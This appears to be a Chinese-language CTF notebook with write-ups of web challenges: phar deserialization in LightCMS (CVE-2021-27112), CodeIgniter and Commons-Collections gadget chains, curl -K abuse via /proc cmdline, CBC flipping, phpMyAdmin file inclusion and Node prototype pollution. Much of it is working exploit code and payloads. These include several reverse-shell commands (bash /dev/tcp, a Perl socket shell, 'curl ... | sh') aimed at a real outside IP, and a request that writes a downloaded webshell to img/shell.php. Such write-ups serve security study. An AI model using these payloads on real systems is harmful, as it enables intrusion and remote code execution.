    //echo base64_encode(serialize($a));

    @unlink('test.phar');

    $phar=new Phar('test.phar');
    $phar->startBuffering();
    //设置头部
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    //将自定义的meta-data存入manifest
    $phar->setMetadata($a);
    $phar->addFromString("test.txt",str_repeat('aaa',1000000));
    //$phar->addFromString("test.txt","test");
    //签名自动计算
    $phar->stopBuffering();
}
```

把链子中文件的漏洞点都人脑过了一遍决定还是debug看看怎么跑的
调的时候踩了一些坑
链子生成phar文件，然后gzip打包上传的时候发现有大小限制

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2022.png)

用str_repeat给文件填充了一些信息 /var/www/public/img/9ea7925c965967e978aecbb5fcb0ec3d.png

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2023.png)

图片删除这里要路径，删除后应该可以通过unlink来触发反序列化

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2024.png)

步入Logger

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2025.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2026.png)

在遍历writer值后进入Mail，这里是对应参数设置的判断函数

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2027.png)

最后结果

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2028.png)

## [CVE-2021-27112]LightCMS #phar反序列化

```php
<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('curl https://your-shell.com/49.232.206.37:23456 | sh');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.jpg');

}
```

后台admin/admin登录

上传图片phar.jpg

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2029.png)

然后再对应路由访问就能远程触发phar

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2030.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2031.png)

触发方式很新颖

## [D3CTF 2019]EasyWeb #代码审计 #二次注入 #phar反序列化 

从index路由过来到Render_model,get_view的sql语句明显有二次注入

```php
<?php

class Render_model extends CI_Model
{
	public $username;
	public $userView;

	public function insert_view($username, $content){
		$this->username = $username;
		$this->userView = $content;
		$this->db->insert('userRender',$this);
	}

	public function get_view($userId){
		$res = $this->db->query("SELECT username FROM userTable WHERE userId='$userId'")->result();
		if($res){
			$username = $res[0]->username;
			$username = $this->sql_safe($username);
			$username = $this->safe_render($username);
			$userView = $this->db->query("SELECT userView FROM userRender WHERE username='$username'")->result();
			$userView = $userView[0]->userView;
			return $userView;
		}else{
			return false;
		}
	}
	private function safe_render($username){
		$username = str_replace(array('{','}'),'',$username);
		return $username;
	}

	private function sql_safe($sql){
		if(preg_match('/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)|/i',$sql)){
			return '';
		}else{
			return $sql;
		}
	}
}
```

需要绕过一下safe_render和sql_safe函数的过滤

过滤顺序是先sql_safe再safe_render所以可以先使用花括弧将被过滤的关键子隔开在通过sql_safe后safe_render又会花括弧去掉实现绕过

非预期：直接注册`' uni{on sele{ct  0x7b7b7068707d7d73797374656d2827636174202f57656c4c5f546831735f31345f666c346727293b7b7b2f7068707d7d #`

7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2032.png)

[2019 D^3 CTF-easyweb预期解复现 | Somnus's blog](https://nikoeurus.github.io/2019/12/12/D%5E3ctf-easyweb/#CI-POP)

跟着调一下，也是学者写一个新路由

display进入

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2033.png)

createTemplate创建模板

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2034.png)

传入的`$template`进入`_getTemplateId()`，在这个函数里拼接为`$_templateId`

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2035.png)

调用Smart_Template_Source的load方法，跟进去

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2036.png)

在load里面正则匹配了$type和$name

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2037.png)

Smart_Resource load方法对data做了很多处理，从函数名看的话大概是注册模板和缓存的

判断控制流是否在已知的类型中在的话就实例化`Smarty_Internal_Resource_Stream()`

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2038.png)

进入后调用`populate`方法,这个方法把data:换成了data://然后调用getContent()

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2039.png)

fopen来模板字符串

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2040.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2041.png)

然后中间就是一大堆smarty模板的处理

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2042.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2043.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2044.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2045.png)

然后最后otput出来

那么把data换成phar是不是就可以触发phar反序列化然后rce了呢，然而php.ini中并没有打开phar.readonly,默认为true，所以没有办法用上面的fopen来触发反序列化

但是中间对流的判断是支持php协议的

传入`php:phar:///etc/passwd`

但是往后调会发现有is_file函数，is_file函数触发phar是没有限制的

**POP链**

全局搜索function __destruct后发现了两个

一个Cache_memcached.php

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2046.png)

一个Cache_redis.php

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2047.png)

显然Cache_redis.php控制更加简单，只要$this→_redis为true就可以控制任意类的close()方法

全局搜close，Session_database_driver.php中当$this→_lock为true就可以调用_release_lock()

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2048.png)

当$this→_platform值为mysql时又可以触发任意类的query

在全局的query中只有DB_driver.php有较为完整的定义

```php
<?php 

class CI_Cache_redis
{
	protected $_redis;

	public function __construct($_redis=""){
		$this->_redis = $_redis;
	}
}

class CI_Session_database_driver extends CI_Session_driver
{
	protected $_platform = "mysql";

	public function __construct($db=""){
		parent::__construct($db);
	}
}

abstract class CI_Session_driver
{
	protected $_lock = true;
	protected $_db;

	public function __construct($db=""){
		$this->_db = $db;
	}
}

abstract class CI_DB_driver
{
	public $cache_on = true;
}

class CI_DB extends CI_DB_driver { }

class CI_DB_mysqli_driver extends CI_DB 
{
	
	public $dbdriver = "../../../../../../tmp/303175f9437d5145afdb341a6236bf2e/somnus";
}

$redis = new CI_Cache_redis(new CI_Session_database_driver(new CI_DB_mysqli_driver()));
echo base64_encode(serialize($redis));

$phar = new Phar("easyweb.phar");
$phar->startBuffering();
$phar->setStub("GIF89A"."__HALT_COMPILER();"); //设置stub，增加gif文件头用以欺骗检测
$phar->setMetadata($redis); //将自定义meta-data存入manifest
$phar->addFromString("test.jpg", "test"); //添加要压缩的文件
$phar->stopBuffering();

 ?>
```

## [D3CTF 2019]Showhub #格式化字符串逃逸

用户密码加密方式

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2049.png)

注册功能调用save方法

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2050.png)

![Untitled](../BUU月赛/attachment/代码审计%206658870bb1d4438684d807c1b2ec69fb/Untitled%2051.png)

注册时传入id为null，那么实质上sql语句是

INSERT INTO `$this->tbname` SET %s VALUE(%s)

格式化字符串逃逸
```

INSERT INTO `user`(`username`,`password`) VALUE('admin','wumonster') ON DUPLICATE KEY UPDATE password='8c1e24558a1317623e71a0def84dba438dfda181d7d96c1223456825b9e1a2f9';`
`username=admin%1$',%1$'wumonster%1$') ON DUPLICATE KEY UPDATE password=%1$'8c1e24558a1317623e71a0def84dba438dfda181d7d96c1223456825b9e1a2f9%1$'#&password=123

```

## [N1CTF2020]DockerManager #系统程序命令利用

index.php没有啥用处，view.php大概就是exec执行了

curl —connect-timeout 10 ‘ . $host_addr . ‘-g’ . $cert . $key . $cacert;

后三个参数已经写死了，只有$host_addr在后面拼接了?all=true

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled.png)

但是截断是发生在escapeshellarg()中的，包裹的引号都仍然存在

那么接下来的思路就是利用curl来实现命令执行或者实现某些操作，这就和nmap 的参数写马和npm包反弹shell思路类似

-一个字母的选项是可以在引号的包裹中正常使用的，这里利用了-K，作用是读取一个文件作为curl的输入参数，语法要求

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%201.png)

也就是将curl中的参数写入文件中，那么问题就转移到了如何在服务器上制作出一个对应的文件

那么顶级的利用思路来了

****/proc/`pid`/cmdline****

当使用exec时，会新开一个进程来执行exec的内容，那么cmdline里的内容就是之前的$cmd，将$cmd中的参数污染为-K能够理解的格式，就可以实现

现在只需要能够命中pid，curl发起时间过短要怎么命中呢，这里有一个知识点

Linux的随机数产生接口/dev/urandom ，会不断的产生随机数，将-K的值指定为这个接口，就让curl去读取就会因为一直无法读取结束，而实现在proc中常驻，从而实现爆破pid值

第一次传参为,使curl常驻

host=-K/dev/urandom%00&cert=1%0a%0aurl="https://49.232.206.37/wumonster.txt"
output="img/shell.php"%0a%0a

?host=-K/dev/urandom%00&cacert=111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl="http://49.232.206.37/wumonster.txt"%0aoutput="img/shell.php"%0a%0a%0a%0a%0a%0a%0a

第二次为

host=-K/proc/pid/cmdline

原本一直没有命中到，直到把脚本里的:81去掉，不是很明白BUU的环境

```python
from time import sleep
import requests
for i in range(1, 1000):
    r = requests.get("http://7db9a488-bdfb-43ef-967b-5ea643b0cf6a.node4.buuoj.cn/view.php?host=-K/proc/" + str(i) + "/cmdline%00")
    if r.status_code != 200:
        sleep(1)
        r = requests.get("http://7db9a488-bdfb-43ef-967b-5ea643b0cf6a.node4.buuoj.cn/view.php?host=-K/proc/" + str(
            i) + "/cmdline%00")
    print(i)
    print(r.text)
```

反弹shell来进行交互

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%202.png)

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%203.png)

直接python

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%204.png)

ps：原本的readflag程序交互时间很短

trap “” 14的原理大概是这样的

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%205.png)



## [CISCN2019 东北赛区 Day2 Web3]Point System #CBC字节翻转攻击

Robots.txt

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%206.png)

访问后发现是一个API的文档

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%207.png)

存在注册接口

测试之后其实是没有用的因为注册目标是127.0.01

burp抓取了一个登录的包改成了注册

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%208.png)

登录时先向/frontend/api/v1/user/login拿了个token

{"code":100,"data":{"token":"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm1HOUNpQnpjcDJ3Y0NXT3FSbGpjWFNlUTBOUm9TVzF1enlHRVFoZE04c1pwdC9pako4WGhCMGltMEVDbkRVWk1tWkE5dVB1N09xajhzdkxncXZBc1FRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiZ2VpU216WUdOM3pCUWxnaDRHR1ZRUzlSendZankwaFMiLCJleHBpcmVfaW4iOjE2NjQ5OTc0MjB9"}}

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%209.png)

将token带上后访问/frontend/api/v1/user/info

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2010.png)

token一眼base64

`{"signed_key":"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZmG9CiBzcp2wcCWOqRljcXSeQ0NRoSW1uzyGEQhdM8sZpt/ijJ8XhB0im0ECnDUZMmZA9uPu7Oqj8svLgqvAsQQ==","role":3,"user_id":1,"payload":"geiSmzYGN3zBQlgh4GGVQS9RzwYjy0hS","expire_in":1664997420}`

signed_key再base64

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2011.png)

ICxkSingDanceRap是这个AES CBC的IV后面的是加密过的后续密文

用padding-oracle攻击的脚本来跑一下,CBC翻转攻击一下，主要是要用登录抓的包返回的token值来攻击拿到反转后的结果将其写入cookie就可以登录了

![Untitled](../BUU月赛/attachment/思路%20e0fa6f8ee23a464bbf26d33136685e05/Untitled%2012.png)

之后就是FFMpeg的视频处理漏洞


## [GWCTF 2019]我有一个数据库 

dirserarch扫一下

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled.png)

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%201.png)

访问phpmyadmin/index.php，拿到版本信息

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%202.png)

搜索对应版本漏洞

[cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)](https://www.jianshu.com/p/fb9c2ae16d09)

- 文件包含：index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%203.png)

index.php?target=db_datadict.php%253f/../../../../../../../../../flag

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%204.png)


## [BJDCTF2020]EasySearch #swp源码泄露

swp源码泄露

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

在username那里写入文件内容，在响应报文那里会有文件位置

![Untitled](../BUU月赛/attachment/信息搜集%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%205.png)

## [RoarCTF 2019]Easy Java #配置文件泄露

试着登录一下，并没有注册的选项

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled.png)

下面的help点一下出现了报错`java.io.FileNotFoundException:{help.docx}`

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%201.png)

java的web.xml泄露

post传参fliename=/WEB-INI/web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

直接文件泄露

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%202.png)

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%203.png)

## [羊城杯 2020]A Piece Of Java #cc链 #恶意mysql
代码分析

主要的两个路由/index和/hello，在hello中有对cookie值的反序列化

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%204.png)

加上引入了commons-collections

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%205.png)

遗憾的是相应的是也设置了seriakiller

SerialKiller.conf为配置文件，可以指定白名单，仅仅对白名单中的类反序列化

SerialKiller.java为ObjectInputStream的子类，覆盖了resolveClass方法（此会被readObject（）方法调用），加入了类名检查，确保反序列的是安全的类。

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%206.png)

在InfoInvocationHandler中可以去触发invoke

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%207.png)

checkAllInfo

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%208.png)

checkAllInfo可以触发connect

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%209.png)

将jar包放到jd-gui中

再服务器起一个mysql恶意服务然后将ysoserial的jar包放在下面

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

```java
package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost("49.232.206.37");
        databaseInfo.setPort("4567");//恶意mysql服务端端口
        ///bin/bash -i >& /dev/tcp/vps/7015 0>&1   反弹shell监听的端口
//        databaseInfo.setUsername("yso_URLDNS_http://hud0xf.ceye.io");
        databaseInfo.setUsername("yso_CommonsCollections5_bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ5LjIzMi4yMDYuMzcvMjM0NTYgMD4mMQ==}|{base64,-d}|{bash,-i}");
        databaseInfo.setPassword("123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

        //System.out.println(databaseInfo.getUsername());
        Method getUsernameMethod = databaseInfo.getClass().getMethod("getUsername");
        String a =(String) getUsernameMethod.invoke(databaseInfo);
        //System.out.println(a);
//        Class c = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
        //创建一个InfoInvocationHandler类对象
        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        //然后使用动态代理，我们代理的是databaseInfo，所以就要获取其类加载器和接口
        Info info =(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);
        //序列化部分，参考MainController.java
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(info);
        oos.close();
        //将序列化结果输出
        //这里的输出语句要注意不要使用System.out.println();
        System.out.printf(new String(Base64.getEncoder().encode(baos.toByteArray())));

    }

}
```

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2010.png)

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2011.png)

## [东华杯2021] ezgadget #CB链

jd-gui分析

User类实现了Serializable接口

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2012.png)

**IndexController**

两个路由/和/readobject

/readobject会收到data数据data值会在base64解码后

对(name.equals("gadgets")) && (year == 2021)进行判断判断成功后执行readObject()

```java
@Controller
public class IndexController
{
  @ResponseBody
  @RequestMapping({"/"})
  public String index(HttpServletRequest request, HttpServletResponse response)
  {
    return "index";
  }
  
  @ResponseBody
  @RequestMapping({"/readobject"})
  public String unser(@RequestParam(name="data", required=true) String data, Model model)
    throws Exception
  {
    byte[] b = Tools.base64Decode(data);
    InputStream inputStream = new ByteArrayInputStream(b);
    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
    String name = objectInputStream.readUTF();
    int year = objectInputStream.readInt();
    if ((name.equals("gadgets")) && (year == 2021)) {
      objectInputStream.readObject();
    }
    return "welcome bro.";
  }
}
```

ToStirngBean

继承ClassLoader，并且实现了Serializable接口，有一个ClassByte对象，可以通过toString来将其还原为一个class对象

```java
public class ToStringBean
  extends ClassLoader
  implements Serializable
{
  private byte[] ClassByte;
  
  public String toString()
  {
    ToStringBean toStringBean = new ToStringBean();
    Class clazz = toStringBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
    Object Obj = null;
    try
    {
      Obj = clazz.newInstance();
    }
    catch (InstantiationException e)
    {
      e.printStackTrace();
    }
    catch (IllegalAccessException e)
    {
      e.printStackTrace();
    }
    return "enjoy it.";
  }
}
```

思路readObject→ToStringBean→toString

exp.java

```java
package com.ezgame.ctf;

import com.ezgame.ctf.tools.ToStringBean;
import com.ezgame.ctf.tools.Tools;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class exp {
    public static void main(String[] args) throws Exception{
        ToStringBean toStringBean = new ToStringBean();
        Field classByteField = toStringBean.getClass().getDeclaredField("ClassByte");
        classByteField.setAccessible(true);
        //获取到shell对象编译后的地址
        byte[] bytes = Files.readAllBytes(Paths.get("G:\\CTF\\2021东华杯\\ezgadget\\exp\\out\\production\\exp\\com\\ezgame\\ctf\\shell.class"));
        //将值传入该对象的成员变量中
        classByteField.set(toStringBean,bytes);
        //到这里，危险函数部分就好了，接下来利用cc5，去调用这个危险函数

        //实例化该类的时候，不能直接像下面这样将参数直接传进行，应该使用反射
        //BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(11111);//这个初始值之后会自动会改，所以这里随便整
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        //反射赋值
        val.set(badAttributeValueExpException,toStringBean);

        //它的readObject方法会去调用成员变量val的toString方法，成员变量val是Object属性的
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        //因为读取参数的时候，会先去读取一个字符串，一个数字，然后才是Object，所以按照顺去output
        objectOutputStream.writeUTF("gadgets");
        objectOutputStream.writeInt(2021);
        //然后才是我们的BadAttributeValueExpException类对象
        objectOutputStream.writeObject(badAttributeValueExpException);

        //base64加密一下
        //转换为字节流
        byte[] bytes1 = byteArrayOutputStream.toByteArray();
        //用该工具类Tools进行base64加密
        String s = Tools.base64Encode(bytes1);
        System.out.println(s);

    }

}
```

shell.java

```java
package com.ezgame.ctf;

import java.io.IOException;
//反弹shell的类
public class shell {
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"calc.exe"});
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
```

把shell.java构建编译后执行exp.java

一开始/bin/bash没弹还蛮奇怪后来反应过来是windows，就改弹计算器了

![Untitled](../BUU月赛/attachment/Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2013.png)




## [XNUCA2019Qualifier]HardJS #robot #xss 

**XSS**

看到这个robot.py感觉可能有xss

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled.png)



## [GKCTF 2021]easynode #原型链污染

看源码，对登录的用户名，密码有waf

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%201.png)

waf是通过for循环来逐个提取字符对比，使用数组绕过，让js的弱类型比较元素，而substr只支持字符串使用，，可以在pyload后面机上pyloda

后加入waf过滤的字符使其转化为str

`username[]=admin'#&username[]=a&username=a&username=a&username=a&username= a&username=a&username=a&username=a&username=(&password=admin`

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%202.png)

`{"msg":"yes","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImFkbWluJyMiLCJhIiwiYSIsImEiLCJhIiwiIGEiLCJhIiwiYSIsImEiLCIoIl0sImV4cCI6MTY2NTI4NjQ0NywiaWF0IjoxNjY1Mjg0NjQ3fQ.pr75fz90M-HkadS3GzcKIfFuNRkniRNsRRr1O9-OPRc"}`

拿到管理员token

将username设为__proto__去访问addAdmin

并且拿该用户的token去adminDIV这样就可以在extend里做污染，然后RCE

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%203.png)

base64的内容`perl -e 'use Socket;$i="49.232.206.37";$p=23456;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’`

`data={"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('echo%20YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjA2LjM3LzIzMzMgMD4mMSI=%3D%7Cbase64%20-d%7Cbash');var __tmp2"}
`
`data={"outputFunctionName":"x;process.mainModule.require('child_process').exec('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iNDkuMjMyLjIwNi4zNyI7JHA9MjM0NTY7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw==|base64 -d|bash');x"}`

回到admin就触发了

## [2021祥云杯]cralwer_z #robot #代码审计

user.js

```jsx
const express = require('express');
const crypto = require('crypto');
const createError = require('http-errors');
const { Op } = require('sequelize');
const { User, Token } = require('../database');
const utils = require('../utils');
const Crawler = require('../crawler');

const router = express.Router();

router.get('/', async (req, res) => {
    const user = await User.findByPk(req.session.userId)
    return res.render('index', { username: user.username });
});

router.get('/profile', async (req, res) => {
    const user = await User.findByPk(req.session.userId);
    return res.render('user', { user });
});

router.post('/profile', async (req, res, next) => {
    let { affiliation, age, bucket } = req.body;
    const user = await User.findByPk(req.session.userId);
